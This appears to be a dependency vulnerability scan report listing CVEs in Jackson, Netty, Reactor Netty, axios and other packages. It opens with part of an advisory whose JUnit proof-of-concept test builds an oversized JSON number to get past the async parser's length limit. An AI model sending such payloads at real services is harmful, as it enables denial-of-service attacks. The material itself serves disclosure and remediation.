     * CWE-770: Allocation of Resources Without Limits or Throttling
     */
    class AsyncParserNumberLengthBypassTest {
    
        private static final int MAX_NUMBER_LENGTH = 1000;
        private static final int TEST_NUMBER_LENGTH = 5000;
    
        private final JsonFactory factory = new JsonFactory();
    
        // CONTROL: Sync parser correctly rejects a number exceeding maxNumberLength
        @Test
        void syncParserRejectsLongNumber() throws Exception {
            byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);
      
      // Output to console
            System.out.println("[SYNC] Parsing " + TEST_NUMBER_LENGTH + "-digit number (limit: " + MAX_NUMBER_LENGTH + ")");
            try {
                try (JsonParser p = factory.createParser(ObjectReadContext.empty(), payload)) {
                    while (p.nextToken() != null) {
                        if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {
                            System.out.println("[SYNC] Accepted number with " + p.getText().length() + " digits — UNEXPECTED");
                        }
                    }
                }
                fail("Sync parser must reject a " + TEST_NUMBER_LENGTH + "-digit number");
            } catch (StreamConstraintsException e) {
                System.out.println("[SYNC] Rejected with StreamConstraintsException: " + e.getMessage());
            }
        }
    
        // VULNERABILITY: Async parser accepts the SAME number that sync rejects
        @Test
        void asyncParserAcceptsLongNumber() throws Exception {
            byte[] payload = buildPayloadWithLongInteger(TEST_NUMBER_LENGTH);
    
            NonBlockingByteArrayJsonParser p =
                (NonBlockingByteArrayJsonParser) factory.createNonBlockingByteArrayParser(ObjectReadContext.empty());
            p.feedInput(payload, 0, payload.length);
            p.endOfInput();
    
            boolean foundNumber = false;
            try {
                while (p.nextToken() != null) {
                    if (p.currentToken() == JsonToken.VALUE_NUMBER_INT) {
                        foundNumber = true;
                        String numberText = p.getText();
                        assertEquals(TEST_NUMBER_LENGTH, numberText.length(),
                            "Async parser silently accepted all " + TEST_NUMBER_LENGTH + " digits");
                    }
                }
                // Output to console
                System.out.println("[ASYNC INT] Accepted number with " + TEST_NUMBER_LENGTH + " digits — BUG CONFIRMED");
                assertTrue(foundNumber, "Parser should have produced a VALUE_NUMBER_INT token");
            } catch (StreamConstraintsException e) {
                fail("Bug is fixed — async parser now correctly rejects long numbers: " + e.getMessage());
            }
            p.close();
        }
    
        private byte[] buildPayloadWithLongInteger(int numDigits) {
            StringBuilder sb = new StringBuilder(numDigits + 10);
            sb.append("{\"v\":");
            for (int i = 0; i < numDigits; i++) {
                sb.append((char) ('1' + (i % 9)));
            }
            sb.append('}');
            return sb.toString().getBytes(StandardCharsets.UTF_8);
        }
    }
    
    ```
    
    
    ### Impact
    A malicious actor can send a JSON document with an arbitrarily long number to an application using the async parser (e.g., in a Spring WebFlux or other reactive application). This can cause:
    1.  **Memory Exhaustion:** Unbounded allocation of memory in the `TextBuffer` to store the number's digits, leading to an `OutOfMemoryError`.
    2.  **CPU Exhaustion:** If the application subsequently calls `getBigIntegerValue()` or `getDecimalValue()`, the JVM can be tied up in O(n^2) `BigInteger` parsing operations, leading to a CPU-based DoS.
    
    ### Suggested Remediation
    
    The async parsing path should be updated to respect the `maxNumberLength` constraint. The simplest fix appears to ensure that `_valueComplete()` or a similar method in the async path calls the appropriate validation methods (`resetInt()` or `resetFloat()`) already present in `ParserBase`, mirroring the behavior of the synchronous parsers.
    
    **NOTE:** This research was performed in collaboration with [rohan-repos](https://github.com/rohan-repos)

error: Package: com.fasterxml.jackson.core:jackson-databind
Installed Version: 2.13.1
Vulnerability CVE-2020-36518
Severity: HIGH
Fixed Version: 2.13.2.1, 2.12.6.1
Link: [CVE-2020-36518](https://avd.aquasec.com/nvd/cve-2020-36518)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = jackson-databind: denial of service via a large depth of nested objects
  = jackson-databind before 2.13.0 allows a Java StackOverflow exception and denial of service via a large depth of nested objects.

error: Package: com.fasterxml.jackson.core:jackson-databind
Installed Version: 2.13.1
Vulnerability CVE-2022-42003
Severity: HIGH
Fixed Version: 2.12.7.1, 2.13.4.2
Link: [CVE-2022-42003](https://avd.aquasec.com/nvd/cve-2022-42003)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = jackson-databind: deep wrapper array nesting wrt UNWRAP_SINGLE_VALUE_ARRAYS
  = In FasterXML jackson-databind before versions 2.13.4.1 and 2.12.17.1, resource exhaustion can occur because of a lack of a check in primitive value deserializers to avoid deep wrapper array nesting, when the UNWRAP_SINGLE_VALUE_ARRAYS feature is enabled.

error: Package: com.fasterxml.jackson.core:jackson-databind
Installed Version: 2.13.1
Vulnerability CVE-2022-42004
Severity: HIGH
Fixed Version: 2.12.7.1, 2.13.4
Link: [CVE-2022-42004](https://avd.aquasec.com/nvd/cve-2022-42004)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = jackson-databind: use of deeply nested arrays
  = In FasterXML jackson-databind before 2.13.4, resource exhaustion can occur because of a lack of a check in BeanDeserializer._deserializeFromArray to prevent use of deeply nested arrays. An application is vulnerable only with certain customized choices for deserialization.

warning: Package: com.fasterxml.woodstox:woodstox-core
Installed Version: 6.2.7
Vulnerability CVE-2022-40152
Severity: MEDIUM
Fixed Version: 6.4.0, 5.4.0
Link: [CVE-2022-40152](https://avd.aquasec.com/nvd/cve-2022-40152)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = woodstox-core: woodstox to serialise XML data was vulnerable to Denial of Service attacks
  = Those using Woodstox to parse XML data may be vulnerable to Denial of Service attacks (DOS) if DTD support is enabled. If the parser is running on user supplied input, an attacker may supply content that causes the parser to crash by stackoverflow. This effect may support a denial of service attack.

warning: Package: io.netty:netty-codec
Installed Version: 4.1.72.Final
Vulnerability CVE-2025-58057
Severity: MEDIUM
Fixed Version: 4.1.125.Final
Link: [CVE-2025-58057](https://avd.aquasec.com/nvd/cve-2025-58057)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty-codec: netty-codec-compression: Netty's BrotliDecoder is vulnerable to DoS via zip bomb style attack
  = Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers & clients. In netty-codec-compression versions 4.1.124.Final and below, and netty-codec versions 4.2.4.Final and below, when supplied with specially crafted input, BrotliDecoder and certain other decompression decoders will allocate a large number of reachable byte buffers, which can lead to denial of service. BrotliDecoder.decompress has no limit in how often it calls pull, decompressing data 64K bytes at a time. The buffers are saved in the output list, and remain reachable until OOM is hit. This is fixed in versions 4.1.125.Final of netty-codec and 4.2.5.Final of netty-codec-compression.

error: Package: io.netty:netty-codec-http
Installed Version: 4.1.72.Final
Vulnerability CVE-2026-33870
Severity: HIGH
Fixed Version: 4.1.132.Final, 4.2.10.Final
Link: [CVE-2026-33870](https://avd.aquasec.com/nvd/cve-2026-33870)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = io.netty/netty-codec-http: Netty: Request smuggling via incorrect parsing of HTTP/1.1 chunked transfer encoding extension values
  = Netty is an asynchronous, event-driven network application framework. In versions prior to 4.1.132.Final and 4.2.10.Final, Netty incorrectly parses quoted strings in HTTP/1.1 chunked transfer encoding extension values, enabling request smuggling attacks. Versions 4.1.132.Final and 4.2.10.Final fix the issue.

warning: Package: io.netty:netty-codec-http
Installed Version: 4.1.72.Final
Vulnerability CVE-2022-24823
Severity: MEDIUM
Fixed Version: 4.1.77.Final
Link: [CVE-2022-24823](https://avd.aquasec.com/nvd/cve-2022-24823)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty: world readable temporary file containing sensitive data
  = Netty is an open-source, asynchronous event-driven network application framework. The package `io.netty:netty-codec-http` prior to version 4.1.77.Final contains an insufficient fix for CVE-2021-21290. When Netty's multipart decoders are used local information disclosure can occur via the local system temporary directory if temporary storing uploads on the disk is enabled. This only impacts applications running on Java version 6 and lower. Additionally, this vulnerability impacts code running on Unix-like systems, and very old versions of Mac OSX and Windows as they all share the system temporary directory between all users. Version 4.1.77.Final contains a patch for this vulnerability. As a workaround, specify one's own `java.io.tmpdir` when starting the JVM or use DefaultHttpDataFactory.setBaseDir(...) to set the directory to something that is only readable by the current user.

warning: Package: io.netty:netty-codec-http
Installed Version: 4.1.72.Final
Vulnerability CVE-2024-29025
Severity: MEDIUM
Fixed Version: 4.1.108.Final
Link: [CVE-2024-29025](https://avd.aquasec.com/nvd/cve-2024-29025)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty-codec-http: Allocation of Resources Without Limits or Throttling
  = Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers & clients. The `HttpPostRequestDecoder` can be tricked to accumulate data. While the decoder can store items on the disk if configured so, there are no limits to the number of fields the form can have, an attacher can send a chunked post consisting of many small fields that will be accumulated in the `bodyListHttpData` list. The decoder cumulates bytes in the `undecodedChunk` buffer until it can decode a field, this field can cumulate data without limits. This vulnerability is fixed in 4.1.108.Final.

warning: Package: io.netty:netty-codec-http
Installed Version: 4.1.72.Final
Vulnerability CVE-2025-67735
Severity: MEDIUM
Fixed Version: 4.2.8.Final, 4.1.129.Final
Link: [CVE-2025-67735](https://avd.aquasec.com/nvd/cve-2025-67735)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty-codec-http: Netty (netty-codec-http): Request Smuggling via CRLF Injection
  = Netty is an asynchronous, event-driven network application framework. In versions prior to 4.1.129.Final and 4.2.8.Final, the `io.netty.handler.codec.http.HttpRequestEncoder` has a CRLF injection with the request URI when constructing a request. This leads to request smuggling when `HttpRequestEncoder` is used without proper sanitization of the URI. Any application / framework using `HttpRequestEncoder` can be subject to be abused to perform request smuggling using CRLF injection. Versions 4.1.129.Final and 4.2.8.Final fix the issue.

note: Package: io.netty:netty-codec-http
Installed Version: 4.1.72.Final
Vulnerability CVE-2025-58056
Severity: LOW
Fixed Version: 4.1.125.Final, 4.2.5.Final
Link: [CVE-2025-58056](https://avd.aquasec.com/nvd/cve-2025-58056)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty-codec-http: Netty is vulnerable to request smuggling due to incorrect parsing of chunk extensions
  = Netty is an asynchronous event-driven network application framework for development of maintainable high performance protocol servers and clients. In versions 4.1.124.Final, and 4.2.0.Alpha3 through 4.2.4.Final, Netty incorrectly accepts standalone newline characters (LF) as a chunk-size line terminator, regardless of a preceding carriage return (CR), instead of requiring CRLF per HTTP/1.1 standards. When combined with reverse proxies that parse LF differently (treating it as part of the chunk extension), attackers can craft requests that the proxy sees as one request but Netty processes as two, enabling request smuggling attacks. This is fixed in versions 4.1.125.Final and 4.2.5.Final.

error: Package: io.netty:netty-codec-http2
Installed Version: 4.1.72.Final
Vulnerability CVE-2025-55163
Severity: HIGH
Fixed Version: 4.2.4.Final, 4.1.124.Final
Link: [CVE-2025-55163](https://avd.aquasec.com/nvd/cve-2025-55163)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty: netty-codec-http2: Netty MadeYouReset HTTP/2 DDoS Vulnerability
  = Netty is an asynchronous, event-driven network application framework. Prior to versions 4.1.124.Final and 4.2.4.Final, Netty is vulnerable to MadeYouReset DDoS. This is a logical vulnerability in the HTTP/2 protocol, that uses malformed HTTP/2 control frames in order to break the max concurrent streams limit - which results in resource exhaustion and distributed denial of service. This issue has been patched in versions 4.1.124.Final and 4.2.4.Final.

error: Package: io.netty:netty-codec-http2
Installed Version: 4.1.72.Final
Vulnerability CVE-2026-33871
Severity: HIGH
Fixed Version: 4.1.132.Final, 4.2.11.Final
Link: [CVE-2026-33871](https://avd.aquasec.com/nvd/cve-2026-33871)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty: Netty: Denial of Service via HTTP/2 CONTINUATION frame flood
  = Netty is an asynchronous, event-driven network application framework. In versions prior to 4.1.132.Final and 4.2.10.Final, a remote user can trigger a Denial of Service (DoS) against a Netty HTTP/2 server by sending a flood of `CONTINUATION` frames. The server's lack of a limit on the number of `CONTINUATION` frames, combined with a bypass of existing size-based mitigations using zero-byte frames, allows an user to cause excessive CPU consumption with minimal bandwidth, rendering the server unresponsive. Versions 4.1.132.Final and 4.2.10.Final fix the issue.

error: Package: io.netty:netty-codec-http2
Installed Version: 4.1.72.Final
Vulnerability GHSA-xpw8-rcwv-8f8p
Severity: HIGH
Fixed Version: 4.1.100.Final
Link: [GHSA-xpw8-rcwv-8f8p](https://github.com/advisories/GHSA-xpw8-rcwv-8f8p)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = io.netty:netty-codec-http2 vulnerable to HTTP/2 Rapid Reset Attack
  = A client might overload the server by issue frequent RST frames. This can cause a massive amount of load on the remote system and so cause a DDOS attack. 
    
    ### Impact
    This is a DDOS attack, any http2 server is affected and so you should update as soon as possible.
    
    ### Patches
    This is patched in version 4.1.100.Final.
    
    ### Workarounds
    A user can limit the amount of RST frames that are accepted per connection over a timeframe manually using either an own `Http2FrameListener` implementation or an `ChannelInboundHandler` implementation (depending which http2 API is used).
    
    ### References
    - https://www.cve.org/CVERecord?id=CVE-2023-44487
    - https://blog.cloudflare.com/technical-breakdown-http2-rapid-reset-ddos-attack/
    - https://cloud.google.com/blog/products/identity-security/google-cloud-mitigated-largest-ddos-attack-peaking-above-398-million-rps/

warning: Package: io.netty:netty-common
Installed Version: 4.1.72.Final
Vulnerability CVE-2024-47535
Severity: MEDIUM
Fixed Version: 4.1.115.Final
Link: [CVE-2024-47535](https://avd.aquasec.com/nvd/cve-2024-47535)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty: Denial of Service attack on windows app using Netty
  = Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers & clients. An unsafe reading of environment file could potentially cause a denial of service in Netty. When loaded on an Windows application, Netty attempts to load a file that does not exist. If an attacker creates such a large file, the Netty application crashes. This vulnerability is fixed in 4.1.115.

warning: Package: io.netty:netty-common
Installed Version: 4.1.72.Final
Vulnerability CVE-2025-25193
Severity: MEDIUM
Fixed Version: 4.1.118.Final
Link: [CVE-2025-25193](https://avd.aquasec.com/nvd/cve-2025-25193)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty: Denial of Service attack on windows app using Netty
  = Netty, an asynchronous, event-driven network application framework, has a vulnerability in versions up to and including 4.1.118.Final. An unsafe reading of environment file could potentially cause a denial of service in Netty. When loaded on an Windows application, Netty attempts to load a file that does not exist. If an attacker creates such a large file, the Netty application crash. A similar issue was previously reported as CVE-2024-47535. This issue was fixed, but the fix was incomplete in that null-bytes were not counted against the input limit. Commit HIDDEN_BY_MEGALINTERcontains an updated fix.

warning: Package: io.netty:netty-handler
Installed Version: 4.1.72.Final
Vulnerability CVE-2023-34462
Severity: MEDIUM
Fixed Version: 4.1.94.Final
Link: [CVE-2023-34462](https://avd.aquasec.com/nvd/cve-2023-34462)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = netty: SniHandler 16MB allocation leads to OOM
  = Netty is an asynchronous event-driven network application framework for rapid development of maintainable high performance protocol servers & clients. The `SniHandler` can allocate up to 16MB of heap for each channel during the TLS handshake. When the handler or the channel does not have an idle timeout, it can be used to make a TCP server using the `SniHandler` to allocate 16MB of heap. The `SniHandler` class is a handler that waits for the TLS handshake to configure a `SslHandler` according to the indicated server name by the `ClientHello` record. For this matter it allocates a `ByteBuf` using the value defined in the `ClientHello` record. Normally the value of the packet should be smaller than the handshake packet but there are not checks done here and the way the code is written, it is possible to craft a packet that makes the `SslClientHelloHandler`. This vulnerability has been fixed in version 4.1.94.Final.

error: Package: io.projectreactor.netty:reactor-netty-core
Installed Version: 1.0.14
Vulnerability CVE-2023-34054
Severity: HIGH
Fixed Version: 1.1.13, 1.0.39
Link: [CVE-2023-34054](https://avd.aquasec.com/nvd/cve-2023-34054)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = Reactor Netty HTTP Server denial of service vulnerability
  = 
    In Reactor Netty HTTP Server, versions 1.1.x prior to 1.1.13 and versions 1.0.x prior to 1.0.39, it is possible for a user to provide specially crafted HTTP requests that may cause a denial-of-service (DoS) condition.
    
    Specifically, an application is vulnerable if Reactor Netty HTTP Server built-in integration with Micrometer is enabled.
    
    
    
    

error: Package: io.projectreactor.netty:reactor-netty-http
Installed Version: 1.0.14
Vulnerability CVE-2023-34062
Severity: HIGH
Fixed Version: 1.1.13, 1.0.39
Link: [CVE-2023-34062](https://avd.aquasec.com/nvd/cve-2023-34062)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = reactor-netty-http: directory traversal vulnerability
  = In Reactor Netty HTTP Server, versions 1.1.x prior to 1.1.13 and versions 1.0.x prior to 1.0.39, a malicious user can send a request using a specially crafted URL that can lead to a directory traversal attack.
    
    Specifically, an application is vulnerable if Reactor Netty HTTP Server is configured to serve static resources.
    
    

warning: Package: io.projectreactor.netty:reactor-netty-http
Installed Version: 1.0.14
Vulnerability CVE-2022-31684
Severity: MEDIUM
Fixed Version: 1.0.24
Link: [CVE-2022-31684](https://avd.aquasec.com/nvd/cve-2022-31684)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = reactor-netty-http: Log request headers in some cases of invalid HTTP requests
  = Reactor Netty HTTP Server, in versions 1.0.11 - 1.0.23, may log request headers in some cases of invalid HTTP requests. The logged headers may reveal valid access tokens to those with access to server logs. This may affect only invalid HTTP requests where logging at WARN level is enabled.

warning: Package: io.projectreactor.netty:reactor-netty-http
Installed Version: 1.0.14
Vulnerability CVE-2025-22227
Severity: MEDIUM
Fixed Version: 1.3.0-M5, 1.2.8
Link: [CVE-2025-22227](https://avd.aquasec.com/nvd/cve-2025-22227)
  ┌─ graph-db/migrator/pom.xml:1:1
  │
1 │ <?xml version="1.0" encoding="UTF-8"?>
  │ ^
  │
  = io.projectreactor.netty/reactor-netty: Reactor Netty Credential Leak via Redirects
  = In some specific scenarios with chained redirects, Reactor Netty HTTP client leaks credentials. In order for this to happen, the HTTP client must have been explicitly configured to follow redirects.

error: Package: ansi-regex
Installed Version: 3.0.0
Vulnerability CVE-2021-3807
Severity: HIGH
Fixed Version: 6.0.1, 5.0.1, 4.1.1, 3.0.1
Link: [CVE-2021-3807](https://avd.aquasec.com/nvd/cve-2021-3807)
    ┌─ tests/element/yarn.lock:471:1
    │  
471 │ ╭ ansi-regex@^3.0.0:
472 │ │   version "3.0.0"
473 │ │   resolved "https://registry.yarnpkg.com/ansi-regex/-/ansi-regex-3.0.0.tgz#HIDDEN_BY_MEGALINTER"
474 │ │   integrity sha1-7QMXwyIGT3lGbAKWa922Bas32Zg=
    │ ╰^
    │  
    = nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes
    = ansi-regex is vulnerable to Inefficient Regular Expression Complexity

error: Package: ansi-regex
Installed Version: 4.1.0
Vulnerability CVE-2021-3807
Severity: HIGH
Fixed Version: 6.0.1, 5.0.1, 4.1.1, 3.0.1
Link: [CVE-2021-3807](https://avd.aquasec.com/nvd/cve-2021-3807)
    ┌─ tests/element/yarn.lock:476:1
    │  
476 │ ╭ ansi-regex@^4.1.0:
477 │ │   version "4.1.0"
478 │ │   resolved "https://registry.yarnpkg.com/ansi-regex/-/ansi-regex-4.1.0.tgz#HIDDEN_BY_MEGALINTER"
479 │ │   integrity sha512-1apePfXM1UOSqw0o9IiFAovVz9M5S1Dg+4TrDwfMewQ6p/rmMueb7tWZjQ1rx4Loy1ArBggoqGpfqqdI4rondg==
    │ ╰^
    │  
    = nodejs-ansi-regex: Regular expression denial of service (ReDoS) matching ANSI escape codes
    = ansi-regex is vulnerable to Inefficient Regular Expression Complexity

error: Package: async
Installed Version: 2.6.3
Vulnerability CVE-2021-43138
Severity: HIGH
Fixed Version: 3.2.2, 2.6.4
Link: [CVE-2021-43138](https://avd.aquasec.com/nvd/cve-2021-43138)
    ┌─ tests/element/yarn.lock:647:1
    │  
647 │ ╭ async@^2.6.0, async@^2.6.2:
648 │ │   version "2.6.3"
649 │ │   resolved "https://registry.yarnpkg.com/async/-/async-2.6.3.tgz#HIDDEN_BY_MEGALINTER"
650 │ │   integrity sha512-zflvls11DCy+dQWzTW2dzuilv8Z5X/pjfmZOWba6TNIVDm+2UDaJmXSOXlasHKfNBs8oo3M0aT50fDEWfKZjXg==
651 │ │   dependencies:
652 │ │     lodash "^4.17.14"
    │ ╰^
    │  
    = async: Prototype Pollution in async
    = In Async before 2.6.4 and 3.x before 3.2.2, a malicious user can obtain privileges via the mapValues() method, aka lib/internal/iterator.js createObjectIterator prototype pollution.

error: Package: axios
Installed Version: 0.21.4
Vulnerability CVE-2025-62718
Severity: CRITICAL
Fixed Version: 1.15.0
Link: [CVE-2025-62718](https://avd.aquasec.com/nvd/cve-2025-62718)
    ┌─ tests/element/yarn.lock:681:1
    │  
681 │ ╭ axios@^0.21.1:
682 │ │   version "0.21.4"
683 │ │   resolved "https://registry.yarnpkg.com/axios/-/axios-0.21.4.tgz#HIDDEN_BY_MEGALINTER"
684 │ │   integrity sha512-ut5vewkiu8jjGBdqpM44XxjuCjq9LAKeHVmoVfHVzy8eHgxxq8SbAVQNovDA8mVi05kP0Ea/n/UzcSHcTJQfNg==
685 │ │   dependencies:
686 │ │     follow-redirects "^1.14.0"
    │ ╰^
    │  
    = axios: Axios: Server-Side Request Forgery and proxy bypass due to improper hostname normalization
    = Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0, Axios does not correctly handle hostname normalization when checking NO_PROXY rules. Requests to loopback addresses like localhost. (with a trailing dot) or [::1] (IPv6 literal) skip NO_PROXY matching and go through the configured proxy. This goes against what developers expect and lets attackers force requests through a proxy, even if NO_PROXY is set up to protect loopback or internal services. This issue leads to the possibility of proxy bypass and SSRF vulnerabilities allowing attackers to reach sensitive loopback or internal services despite the configured protections. This vulnerability is fixed in 1.15.0.

error: Package: axios
Installed Version: 0.21.4
Vulnerability CVE-2026-40175
Severity: CRITICAL
Fixed Version: 1.15.0
Link: [CVE-2026-40175](https://avd.aquasec.com/nvd/cve-2026-40175)
    ┌─ tests/element/yarn.lock:681:1
    │  
681 │ ╭ axios@^0.21.1:
682 │ │   version "0.21.4"
683 │ │   resolved "https://registry.yarnpkg.com/axios/-/axios-0.21.4.tgz#HIDDEN_BY_MEGALINTER"
684 │ │   integrity sha512-ut5vewkiu8jjGBdqpM44XxjuCjq9LAKeHVmoVfHVzy8eHgxxq8SbAVQNovDA8mVi05kP0Ea/n/UzcSHcTJQfNg==
685 │ │   dependencies:
686 │ │     follow-redirects "^1.14.0"
    │ ╰^
    │  
    = Axios is a promise based HTTP client for the browser and Node.js. Prio ...
    = Axios is a promise based HTTP client for the browser and Node.js. Prior to 1.15.0, the Axios library is vulnerable to a specific "Gadget" attack chain that allows Prototype Pollution in any third-party dependency to be escalated into Remote Code Execution (RCE) or Full Cloud Compromise (via AWS IMDSv2 bypass). This vulnerability is fixed in 1.15.0.

error: Package: axios
Installed Version: 0.21.4
Vulnerability CVE-2025-27152
Severity: HIGH
Fixed Version: 1.8.2, 0.30.0
Link: [CVE-2025-27152](https://avd.aquasec.com/nvd/cve-2025-27152)
    ┌─ tests/element/yarn.lock:681:1
    │  
681 │ ╭ axios@^0.21.1:
682 │ │   version "0.21.4"
683 │ │   resolved "https://registry.yarnpkg.com/axios/-/axios-0.21.4.tgz#HIDDEN_BY_MEGALINTER"
684 │ │   integrity sha512-ut5vewkiu8jjGBdqpM44XxjuCjq9LAKeHVmoVfHVzy8eHgxxq8SbAVQNovDA8mVi05kP0Ea/n/UzcSHcTJQfNg==
685 │ │   dependencies:
686 │ │     follow-redirects "^1.14.0"
    │ ╰^
    │  
    = axios: Possible SSRF and Credential Leakage via Absolute URL in axios Requests
    = axios is a promise based HTTP client for the browser and node.js. The issue occurs when passing absolute URLs rather than protocol-relative URLs to axios. Even if ⁠baseURL is set, axios sends the request to the specified absolute URL, potentially causing SSRF and credential leakage. This issue impacts both server-side and client-side usage of axios. This issue is fixed in 1.8.2.

error: Package: axios
Installed Version: 0.21.4
Vulnerability CVE-2026-25639
Severity: HIGH
Fixed Version: 1.13.5, 0.30.3
Link: [CVE-2026-25639](https://avd.aquasec.com/nvd/cve-2026-25639)
    ┌─ tests/element/yarn.lock:681:1
    │  
681 │ ╭ axios@^0.21.1:
682 │ │   version "0.21.4"
683 │ │   resolved "https://registry.yarnpkg.com/axios/-/axios-0.21.4.tgz#HIDDEN_BY_MEGALINTER"
684 │ │   integrity sha512-ut5vewkiu8jjGBdqpM44XxjuCjq9LAKeHVmoVfHVzy8eHgxxq8SbAVQNovDA8mVi05kP0Ea/n/UzcSHcTJQfNg==
685 │ │   dependencies:
686 │ │     follow-redirects "^1.14.0"
    │ ╰^
    │  
    = axios: Axios affected by Denial of Service via __proto__ Key in mergeConfig
    = Axios is a promise based HTTP client for the browser and Node.js. Prior to versions 0.30.3 and 1.13.5, the mergeConfig function in axios crashes with a TypeError when processing configuration objects containing __proto__ as an own property. An attacker can trigger this by providing a malicious configuration object created via JSON.parse(), causing complete denial of service. This vulnerability is fixed in versions 0.30.3 and 1.13.5.

warning: Package: axios
Installed Version: 0.21.4
Vulnerability CVE-2023-45857
Severity: MEDIUM
Fixed Version: 1.6.0, 0.28.0
Link: [CVE-2023-45857](https://avd.aquasec.com/nvd/cve-2023-45857)
    ┌─ tests/element/yarn.lock:681:1
    │  
681 │ ╭ axios@^0.21.1:
682 │ │   version "0.21.4"
683 │ │   resolved "https://registry.yarnpkg.com/axios/-/axios-0.21.4.tgz#HIDDEN_BY_MEGALINTER"
684 │ │   integrity sha512-ut5vewkiu8jjGBdqpM44XxjuCjq9LAKeHVmoVfHVzy8eHgxxq8SbAVQNovDA8mVi05kP0Ea/n/UzcSHcTJQfNg==
685 │ │   dependencies:
686 │ │     follow-redirects "^1.14.0"
    │ ╰^
    │  
    = axios: exposure of confidential data stored in cookies
    = An issue discovered in Axios 1.5.1 inadvertently reveals the confidential XSRF-TOKEN stored in cookies by including it in the HTTP header X-XSRF-TOKEN for every request made to any host allowing attackers to view sensitive information.

warning: Package: bn.js
Installed Version: 4.12.0
Vulnerability CVE-2026-2739
Severity: MEDIUM
Fixed Version: 4.12.3, 5.2.3
Link: [CVE-2026-2739](https://avd.aquasec.com/nvd/cve-2026-2739)
    ┌─ tests/element/yarn.lock:760:1
    │  
760 │ ╭ bn.js@^4.0.0, bn.js@^4.1.0, bn.js@^4.11.9:
761 │ │   version "4.12.0"
762 │ │   resolved "https://registry.yarnpkg.com/bn.js/-/bn.js-4.12.0.tgz#HIDDEN_BY_MEGALINTER"
763 │ │   integrity sha512-c98Bf3tPniI+scsdk237ku1Dc3ujXQTSgyiPUDEOe7tRkhrqridvh8klBv0HCEso1OLOYcHuCv/cS6DNxKH+ZA==
    │ ╰^
    │  
    = bn.js: bn.js: Denial of Service via calling maskn(0)
    = This affects versions of the package bn.js before 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.

warning: Package: bn.js
Installed Version: 5.2.0
Vulnerability CVE-2026-2739
Severity: MEDIUM
Fixed Version: 4.12.3, 5.2.3
Link: [CVE-2026-2739](https://avd.aquasec.com/nvd/cve-2026-2739)
    ┌─ tests/element/yarn.lock:765:1
    │  
765 │ ╭ bn.js@^5.0.0:
766 │ │   version "5.2.0"
767 │ │   resolved "https://registry.yarnpkg.com/bn.js/-/bn.js-5.2.0.tgz#HIDDEN_BY_MEGALINTER"
768 │ │   integrity sha512-D7iWRBvnZE8ecXiLj/9wbxH7Tk79fAh8IHaTNq1RWRixsS02W+5qS+iE9yq6RYl0asXx5tw0bLhmT5pIfbSquw==
    │ ╰^
    │  
    = bn.js: bn.js: Denial of Service via calling maskn(0)
    = This affects versions of the package bn.js before 5.2.3. Calling maskn(0) on any BN instance corrupts the internal state, causing toString(), divmod(), and other methods to enter an infinite loop, hanging the process indefinitely.

error: Package: braces
Installed Version: 2.3.2
Vulnerability CVE-2024-4068
Severity: HIGH
Fixed Version: 3.0.3
Link: [CVE-2024-4068](https://avd.aquasec.com/nvd/cve-2024-4068)
    ┌─ tests/element/yarn.lock:797:1
    │  
797 │ ╭ braces@^2.3.1, braces@^2.3.2:
798 │ │   version "2.3.2"
799 │ │   resolved "https://registry.yarnpkg.com/braces/-/braces-2.3.2.tgz#HIDDEN_BY_MEGALINTER"
800 │ │   integrity sha512-aNdbnj9P8PjdXU4ybaWLK2IF3jc/EoDYbC7AazW6to3TRsfXxscC9UXOB5iDiEQrkyIbWp2SLQda4+QAa7nc3w==
    · │
810 │ │     split-string "^3.0.2"
811 │ │     to-regex "^3.0.1"
    │ ╰^
    │  
